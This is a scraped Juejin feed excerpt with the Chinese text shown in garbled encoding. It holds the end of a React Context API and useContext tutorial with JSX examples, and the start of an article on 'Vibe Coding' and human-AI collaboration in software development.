<li><strong>æ•°æ®æ¥æºæ¸…æ™°</strong>ï¼šæ¶ˆè´¹ç»„ä»¶ç›´æ¥å¯¼å…¥ Contextï¼Œä¸€ç›®äº†ç„¶ã€‚</li>
<li><strong>çµæ´»æ€§é«˜</strong>ï¼šProvider å¯ä»¥åŒ…è£¹ä»»æ„å­æ ‘ï¼Œæ”¯æŒå±€éƒ¨å…±äº«ã€‚</li>
<li><strong>æ€§èƒ½å‹å¥½</strong>ï¼ˆæ³¨æ„äº‹é¡¹è§ä¸‹æ–‡ï¼‰ï¼šReact ä¼šä¼˜åŒ–åªé‡æ¸²æŸ“å®é™…æ¶ˆè´¹çš„ç»„ä»¶ã€‚</li>
</ol>
<h2 data-id="heading-6">è¿›é˜¶ï¼šåŠ¨æ€æ›´æ–° Context æ•°æ®</h2>
<p>å•çº¯çš„å¯¹è±¡å…±äº«å·²è¶³å¤Ÿå¼ºå¤§ï¼Œä½†çœŸå®åœºæ™¯ä¸­ç”¨æˆ·æ•°æ®å¾€å¾€éœ€è¦æ›´æ–°ï¼ˆå¦‚ç™»å½•/é€€å‡ºï¼‰ã€‚</p>
<p>æ¨èå°†çŠ¶æ€å’Œæ›´æ–°å‡½æ•°ä¸€èµ·æä¾›ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// App.jsx</span>
<span class="hljs-keyword">import</span> { useState, createContext } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"Andrew"</span> });

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">user</span>, <span class="hljs-attr">setUser</span> }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Page</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span>
  );
}
</code></pre>
<p>æ¶ˆè´¹æ–¹ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// UserInfo.jsx</span>
<span class="hljs-keyword">const</span> { user, setUser } = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);

<span class="hljs-comment">// ç¤ºä¾‹ï¼šé€€å‡ºç™»å½•</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setUser(null)}&gt;é€€å‡º<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
{user ? <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span> : <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>æœªç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>}
</code></pre>
<p>è¿™æ ·ï¼Œä»»ä½•ç»„ä»¶éƒ½èƒ½è¯»å–å¹¶ä¿®æ”¹å…¨å±€ç”¨æˆ·çŠ¶æ€ã€‚</p>
<h2 data-id="heading-7">æœ€ä½³å®è·µä¸æ³¨æ„äº‹é¡¹</h2>
<ol>
<li>
<p><strong>å•ç‹¬æ–‡ä»¶ç®¡ç† Context</strong>ï¼šå¤§å‹é¡¹ç›®ä¸­ï¼Œå°† createContextã€Provider å°è£…æˆç‹¬ç«‹æ–‡ä»¶ï¼ˆå¦‚ UserContext.jsxï¼‰ï¼Œä¾¿äºå›¢é˜Ÿåä½œã€‚</p>
</li>
<li>
<p><strong>é¿å…é¢‘ç¹æ›´æ–°å¤§å¯¹è±¡</strong>ï¼šContext ä½¿ç”¨å¼•ç”¨ç›¸ç­‰æ€§åˆ¤æ–­é‡æ¸²æŸ“ã€‚å¦‚æœæ¯æ¬¡ Provider value éƒ½æ˜¯æ–°å¯¹è±¡ï¼ˆå¦‚ {...}ï¼‰ï¼Œä¼šå¯¼è‡´æ‰€æœ‰æ¶ˆè´¹è€…é‡æ¸²æŸ“ã€‚è§£å†³åŠæ³•ï¼š</p>
<ul>
<li>
<p>ä½¿ç”¨ useMemo ç¨³å®š valueï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">value</span> = useMemo(() =&gt; ({ user, setUser }), [user])<span class="hljs-comment">;</span>
&lt;Provider <span class="hljs-attr">value</span>={value}&gt;
</code></pre>
</li>
<li>
<p>æˆ–æ‹†åˆ†å¤šä¸ª Contextï¼ˆä¸»é¢˜ã€ç”¨æˆ·ã€é…ç½®åˆ†å¼€ï¼‰ã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>ä¸è¦æ»¥ç”¨</strong>ï¼šContext é€‚åˆâ€œå…¨å±€æ€§â€ä½é¢‘å˜åŒ–æ•°æ®ï¼ˆå¦‚ç”¨æˆ·ã€ä¸»é¢˜ã€è¯­è¨€ï¼‰ã€‚é«˜é¢‘å˜åŒ–æˆ–å¤æ‚çŠ¶æ€æ¨è Zustandã€Jotai æˆ– Reduxã€‚</p>
</li>
<li>
<p><strong>ç»“åˆ React.memo ä¼˜åŒ–</strong>ï¼šå¦‚æœæ¶ˆè´¹è€…ä¸ä¾èµ– Contextï¼Œå¯ç”¨ React.memo é˜²æ­¢ä¸å¿…è¦é‡æ¸²æŸ“ã€‚</p>
</li>
<li>
<p><strong>TypeScript æ”¯æŒ</strong>ï¼šcreateContext æ—¶å¯æŒ‡å®šç±»å‹ï¼Œæå‡ç±»å‹å®‰å…¨ã€‚</p>
</li>
</ol>
<h2 data-id="heading-8">å®é™…åº”ç”¨åœºæ™¯ä¸¾ä¾‹</h2>
<ul>
<li><strong>ç”¨æˆ·ä¿¡æ¯</strong>ï¼šç™»å½•çŠ¶æ€ã€å¤´åƒã€æƒé™ã€‚</li>
<li><strong>ä¸»é¢˜åˆ‡æ¢</strong>ï¼šdark/light modeã€‚</li>
<li><strong>å›½é™…åŒ–</strong>ï¼šå½“å‰è¯­è¨€åŒ…ã€‚</li>
<li><strong>å¸ƒå±€é…ç½®</strong>ï¼šä¾§è¾¹æ å±•å¼€çŠ¶æ€ã€‚</li>
</ul>
<p>è¿™äº›æ•°æ®å¾€å¾€è¢«å¤šä¸ªæ·±å±‚ç»„ä»¶ä½¿ç”¨ï¼Œä½¿ç”¨ Context èƒ½æå¤§ç®€åŒ–ä»£ç ã€‚</p>
<h2 data-id="heading-9">ç»“è¯­</h2>
<p>Props Drilling æ˜¯ React æ–°æ‰‹æœ€å…ˆæ¥è§¦çš„æ–¹å¼ï¼Œä½†éšç€é¡¹ç›®è§„æ¨¡å¢é•¿ï¼Œå®ƒä¼šæˆä¸ºç»´æŠ¤çš„æ·é”ã€‚Context API + useContext æä¾›äº†åŸç”Ÿã€è½»é‡çº§çš„è§£å†³æ–¹æ¡ˆï¼Œè®©è·¨å±‚çº§é€šä¿¡å˜å¾—ä¼˜é›…è€Œé«˜æ•ˆã€‚</p>
<p>è®°ä½æ ¸å¿ƒåŸåˆ™ï¼š<strong>æ•°æ®åœ¨å¤–å±‚æä¾›ï¼Œæ¶ˆè´¹æ–¹ä¸»åŠ¨è·å–</strong>ã€‚è¿™ä¸ä»…è§£å†³äº† Props Drillingï¼Œè¿˜ä¸ºæœªæ¥æ‰©å±•ï¼ˆå¦‚ç»“åˆ Reducer å®ç°å°å‹çŠ¶æ€ç®¡ç†ï¼‰æ‰“ä¸‹åŸºç¡€ã€‚</p>
<p>åœ¨ 2025 å¹´çš„ React ç”Ÿæ€ä¸­ï¼ŒContext API ä¾ç„¶æ˜¯ä¸­å°å‹é¡¹ç›®å…¨å±€çŠ¶æ€ç®¡ç†çš„é¦–é€‰ã€‚åˆç†ä½¿ç”¨å®ƒï¼Œä½ çš„ç»„ä»¶æ ‘å°†æ›´æ¸…æ™°ã€å¯ç»´æŠ¤æ€§æ›´å¼ºã€‚</p>
<p>èµ¶ç´§åœ¨ä½ çš„é¡¹ç›®ä¸­è¯•è¯•å§â€”â€”ä»ä¸€ä¸ªç®€å•çš„ç”¨æˆ·ä¸Šä¸‹æ–‡å¼€å§‹ï¼Œä½ ä¼šçˆ±ä¸Šè¿™ç§â€œè·³è·ƒå¼â€æ•°æ®ä¼ é€’çš„è‡ªç”±ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vibe Coding ä¹‹é“ï¼šä»æ‰§è¡Œè€…åˆ°äººæœºå›¢é˜ŸæŒ‡æŒ¥å®˜]]></title>    <link>https://juejin.cn/post/7589093939656228916</link>    <guid>https://juejin.cn/post/7589093939656228916</guid>    <pubDate>2025-12-29T10:19:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589093939656228916" data-draft-id="7589104492882526260" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vibe Coding ä¹‹é“ï¼šä»æ‰§è¡Œè€…åˆ°äººæœºå›¢é˜ŸæŒ‡æŒ¥å®˜"/> <meta itemprop="keywords" content="VibeCoding"/> <meta itemprop="datePublished" content="2025-12-29T10:19:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œå·´å·´AIç¼–ç¨‹ç¤¾åŒº"/> <meta itemprop="url" content="https://juejin.cn/user/1757434193132441"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vibe Coding ä¹‹é“ï¼šä»æ‰§è¡Œè€…åˆ°äººæœºå›¢é˜ŸæŒ‡æŒ¥å®˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1757434193132441/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œå·´å·´AIç¼–ç¨‹ç¤¾åŒº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:19:45.000Z" title="Mon Dec 29 2025 10:19:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼æˆ‘æ˜¯ OneOneTalk CTO å½­è¶…ã€‚ä»Šå¤©åˆ†äº«Â Vibe Coding æ–¹æ³•è®ºâ€”â€”Vibe codingä¹‹é“ã€‚</p>
<p>AIæŠ€æœ¯é£é€Ÿå‘å±•çš„ä»Šå¤©ï¼Œè½¯ä»¶å¼€å‘æ­£åœ¨ç»å†ä¸€åœºå·¨å¤§å˜é©ã€‚ ä¼ ç»Ÿçš„ç¼–ç¨‹æ–¹å¼æ­£åœ¨è¢«é‡æ–°å®šä¹‰ï¼Œå¼€å‘è€…ä¸ä»£ç ä¹‹é—´çš„å…³ç³»ä¹Ÿåœ¨å‘ç”Ÿæ ¹æœ¬æ€§è½¬å˜ã€‚ä»Šå¤©æˆ‘ä»¬å°†æ·±å…¥æ¢è®¨ Vibe Coding è¿™ä¸€æ¦‚å¿µï¼Œåˆ†æ AI ç¼–ç¨‹å¦‚ä½•é‡å¡‘æˆ‘ä»¬çš„å¼€å‘æµç¨‹ã€å›¢é˜Ÿåä½œæ¨¡å¼ä»¥åŠä¸ªäººèŒä¸šå‘å±•è·¯å¾„ï¼Œå¹¶åˆ†äº«åœ¨å®é™…é¡¹ç›®ä¸­çš„æœ€ä½³å®è·µå’Œç»éªŒæ•™è®­ã€‚</p>
<h2 data-id="heading-0">01 æ—¶ä»£ä¹‹å˜ï¼šä»äººé€‚åº”æœºå™¨åˆ°æœºå™¨ç†è§£äºº</h2>
<p>Vibe Codingè¿™ä¸€æ¦‚å¿µæœ€æ—©ç”±Andrej Karpathyâ€”â€”OpenAI è”åˆåˆ›å§‹äººã€ç‰¹æ–¯æ‹‰å‰ AI æ€»ç›‘æå‡ºï¼Œæ ‡å¿—ç€ç¼–ç¨‹èŒƒå¼çš„ä¸€æ¬¡é‡å¤§è½¬æŠ˜ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œç¼–ç¨‹æœ¬è´¨ä¸Šæ˜¯"äººé€‚åº”æœºå™¨"çš„è¿‡ç¨‹ï¼šå¼€å‘è€…éœ€è¦å°†äººç±»çš„æ€ç»´é€»è¾‘è½¬åŒ–ä¸ºè®¡ç®—æœºèƒ½å¤Ÿç†è§£çš„æŒ‡ä»¤ï¼Œè¿™ä¸ªè¿‡ç¨‹æ—¢ç¹çåˆå®¹æ˜“å‡ºé”™ã€‚</p>
<p>ç„¶è€Œï¼Œéšç€å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰æŠ€æœ¯çš„çªç ´æ€§è¿›å±•ï¼Œç‰¹åˆ«æ˜¯DeepSeekç­‰å·¥å…·çš„å‡ºç°ï¼Œæˆ‘ä»¬è¿æ¥äº†"æœºå™¨ç†è§£äºº"çš„æ–°æ—¶ä»£ã€‚åœ¨è¿™ä¸ªæ–°èŒƒå¼ä¸‹ï¼Œå¼€å‘è€…ä¸å†éœ€è¦ç²¾ç¡®åœ°å‘Šè¯‰è®¡ç®—æœºæ¯ä¸€æ­¥è¯¥åšä»€ä¹ˆï¼Œè€Œæ˜¯é€šè¿‡è‡ªç„¶è¯­è¨€è¡¨è¾¾æ„å›¾ï¼Œè®©AIç†è§£å¹¶æ‰§è¡Œå…·ä½“çš„å®ç°ç»†èŠ‚ã€‚</p>
<p>è¿™ç§è½¬å˜ä¸ä»…ä»…æ˜¯æŠ€æœ¯å±‚é¢çš„é©æ–°ï¼Œæ›´æ˜¯æ€ç»´æ–¹å¼çš„æ ¹æœ¬æ€§é¢ è¦†ã€‚ä¼ ç»Ÿçš„"å¤æ³•ç¼–ç¨‹"è¦æ±‚å¼€å‘è€…äº²æ‰‹æ•²å‡»æ¯ä¸€è¡Œä»£ç ï¼Œå¯¹è¯­æ³•ã€é€»è¾‘ã€è¾¹ç•Œæ¡ä»¶ç­‰ç»†èŠ‚éƒ½è¦äº†å¦‚æŒ‡æŒã€‚è¿™ç§æ–¹å¼è™½ç„¶èƒ½å¤Ÿç¡®ä¿ä»£ç è´¨é‡ï¼Œä½†æ•ˆç‡ä½ä¸‹ï¼Œä¸”å¯¹å¼€å‘è€…çš„æŠ€æœ¯è¦æ±‚æé«˜ã€‚</p>
<p>è€Œåœ¨AIç¼–ç¨‹æ—¶ä»£ï¼Œè§’è‰²å‘ç”Ÿäº†æ ¹æœ¬æ€§è½¬å˜ï¼šäººæˆä¸ºæŒ‡æŒ¥è€…ï¼Œè´Ÿè´£è¡¨è¾¾æ„å›¾å’Œå¯¹ç»“æœè´Ÿè´£ï¼›<strong>AIæˆä¸ºæ‰§è¡Œè€…ï¼Œè´Ÿè´£å…·ä½“çš„å®ç°ç»†èŠ‚ã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32f0ac730a2247b484a534e4509ae2dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=P5lI13ny099x%2FARGviMEkh3dhYU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">02 åä½œä¹‹é“ï¼šäººæœºå…³ç³»çš„å“²å­¦æ€è€ƒ</h2>
<h3 data-id="heading-2">äººæœºåä½œçš„å½¢æ€</h3>
<p>å›é¡¾AIç¼–ç¨‹çš„å‘å±•å†ç¨‹ï¼Œäººæœºåä½œå¯èƒ½æœ‰ä»¥ä¸‹å‡ ç§å½¢æ€ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdea6a0837834cdaa7928ebd84618fa5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=TwJhU27YSNN0L5ne%2F%2BBTw8Qw5A4%3D" alt="" loading="lazy"/></p>
<ul>
<li>ä¸»ä»†æ¨¡å¼<br/>
å¼€å‘è€…éœ€è¦æ‰‹åŠ¨å¤åˆ¶ç²˜è´´ä»£ç ï¼Œåœ¨IDEå’Œ ChatGPT ç­‰èŠå¤©å·¥å…·ä¹‹é—´åå¤åˆ‡æ¢ã€‚AIçš„ä½œç”¨ä»…ä»…æ˜¯å›ç­”å…·ä½“é—®é¢˜ï¼Œæ— æ³•ç†è§£é¡¹ç›®çš„æ•´ä½“ä¸Šä¸‹æ–‡ï¼Œæ›´æ— æ³•è‡ªä¸»è§£å†³é—®é¢˜ã€‚</li>
<li>æ›¿ä»£æ¨¡å¼<br/>
éšç€Qoderç­‰AI IDEçš„å‡ºç°ï¼Œç¼–ç¨‹Agentå…·å¤‡äº†è‡ªä¸»è§„åˆ’èƒ½åŠ›ã€‚å¼€å‘è€…åªéœ€æè¿°é—®é¢˜ï¼ŒAgentå°±èƒ½è‡ªåŠ¨åˆ†æã€è§„åˆ’è§£å†³æ–¹æ¡ˆå¹¶æ‰§è¡Œã€‚æ›´é‡è¦çš„æ˜¯ï¼ŒAgentèƒ½å¤Ÿç†è§£æ¨¡ç³Šçš„æŒ‡ä»¤ï¼Œå¦‚"å¸®æˆ‘ä¿®å¤è¿™ä¸ª"ï¼Œè€Œä¸éœ€è¦ç²¾ç¡®çš„é”™è¯¯æè¿°ã€‚</li>
<li>å…±ç”Ÿæ¨¡å¼<br/>
è¿™æ˜¯æˆ‘ä»¬ç›®å‰æ‰€å¤„çš„é˜¶æ®µï¼Œä¹Ÿæ˜¯æœ€ç†æƒ³çš„åä½œæ¨¡å¼ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œäººå’ŒAIå„è‡ªå‘æŒ¥ä¼˜åŠ¿ï¼Œå½¢æˆ1+1&gt;2çš„ååŒæ•ˆåº”ã€‚äººè´Ÿè´£æä¾›ç›®æ ‡ã€åˆ¤æ–­ä»·å€¼ã€æ‰¿æ‹…è´£ä»»ï¼›AIè´Ÿè´£æ‰§è¡Œç»†èŠ‚ã€å¤„ç†é‡å¤å·¥ä½œã€æä¾›æŠ€æœ¯å»ºè®®ã€‚</li>
</ul>
<h3 data-id="heading-3">åä½œè¿›åŒ–çš„è¿‡ç¨‹</h3>
<p>åä½œè¿›åŒ–æœ‰ä»¥ä¸‹å‡ ä¸ªè¿‡ç¨‹ï¼š</p>
<ol>
<li>çŸ¥å·±Â·æ˜ç¡®è¾¹ç•Œï¼šäººçš„ä¼˜åŠ¿æ˜¯åˆ›æ„ã€åˆ¤æ–­ã€è´£ä»»ã€ä»·å€¼è§‚ã€è·¨åŸŸæ€ç»´ã€æƒ…æ„Ÿå…±é¸£ã€‚</li>
<li>çŸ¥å½¼ç†è§£Â·AIï¼šAIçš„ä¼˜åŠ¿ï¼šé€Ÿåº¦ã€è®°å¿†ã€æ¨¡å¼è¯†åˆ«ã€ä¸çŸ¥ç–²å€¦ã€æ— æƒ…ç»ªæ³¢åŠ¨ã€‚</li>
<li>åˆä¸€Â·äººæœºå…±èˆï¼šæœ€ä½³çŠ¶æ€æ˜¯äººè´Ÿè´£"ä¸ºä»€ä¹ˆ"å’Œ"åšä»€ä¹ˆ"ï¼ŒAIè´Ÿè´£"æ€ä¹ˆåš"ã€‚</li>
<li>ä¿¡ä»»Â·ä½†è¦éªŒè¯ï¼šAIä¼šçŠ¯é”™ï¼Œäººè¦æœ‰åˆ¤æ–­åŠ›ï¼›ä¿¡ä»»ä¸æ˜¯ç›²ä»ï¼Œè€Œæ˜¯åŸºäºç†è§£çš„å§”æ‰˜ã€‚</li>
<li>è¿­ä»£Â·å¯¹è¯å¼åä½œï¼šä¸æ˜¯ä¸€æ¬¡æ€§äº¤ä»˜ï¼Œè€Œæ˜¯æŒç»­å¯¹è¯ï¼›åé¦ˆ-ä¿®æ­£-ä¼˜åŒ–çš„é—­ç¯ã€‚</li>
<li>æˆé•¿Â·å…±åŒè¿›åŒ–ï¼šäººåœ¨åä½œä¸­æå‡AIä½¿ç”¨èƒ½åŠ›ï¼ŒAIåœ¨åé¦ˆä¸­æ›´æ‡‚ä½ çš„æ„å›¾ã€‚</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0768a21cb929491c914ba4d1e1ef617e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=PuPlA9led2aWW%2FBpqwPHsOgWluI%3D" alt="" loading="lazy"/></p>
<p>å°½ç®¡AIåœ¨é€Ÿåº¦ã€è®°å¿†ã€å¤šæ¨¡æ€è¯†åˆ«ç­‰æ–¹é¢å…·æœ‰æ˜¾è‘—ä¼˜åŠ¿ï¼Œä½†åœ¨å…³é”®é¢†åŸŸäººçš„ä½œç”¨ä»ç„¶ä¸å¯æ›¿ä»£ã€‚</p>
<p>ä»¥åŒ»ç–—è¯Šæ–­ä¸ºä¾‹ï¼Œå³ä½¿ AI åœ¨æŸäº›ç‰¹å®šè¯Šæ–­ä»»åŠ¡ä¸­çš„å‡†ç¡®ç‡å·²æ˜¾è‘—è¶…è¿‡äººç±»ä¸“å®¶ï¼ŒåŒ»é™¢ä»ç„¶è¦æ±‚åŒ»ç”Ÿæ‰‹åŠ¨ç­¾å­—ç¡®è®¤ AI çš„è¯Šæ–­ç»“æœã€‚è¿™æ˜¯å› ä¸ºAIæ— æ³•æ‰¿æ‹…æ³•å¾‹è´£ä»»ã€‚</p>
<p>åŒæ ·çš„é“ç†é€‚ç”¨äºè½¯ä»¶å¼€å‘ï¼š</p>
<ul>
<li>è´£ä»»å½’å±ï¼šæœ€ç»ˆçš„ä»£ç è´¨é‡å’Œç³»ç»Ÿç¨³å®šæ€§ä»éœ€äººç±»å¼€å‘è€…è´Ÿè´£ã€‚</li>
<li>ä»·å€¼åˆ¤æ–­ï¼šAIæ— æ³•åˆ¤æ–­åŠŸèƒ½æ˜¯å¦çœŸæ­£æ»¡è¶³ç”¨æˆ·éœ€æ±‚ã€‚</li>
<li>åˆ›æ–°æ€ç»´ï¼šçœŸæ­£çš„åˆ›æ–°æ¥è‡ªäºäººç±»å¯¹é—®é¢˜çš„æ·±åˆ»ç†è§£å’Œç‹¬ç‰¹è§†è§’ã€‚</li>
<li>ä¼¦ç†è€ƒé‡ï¼šæŠ€æœ¯åº”ç”¨çš„ç¤¾ä¼šå½±å“éœ€è¦äººç±»è¿›è¡Œé“å¾·åˆ¤æ–­ã€‚</li>
</ul>
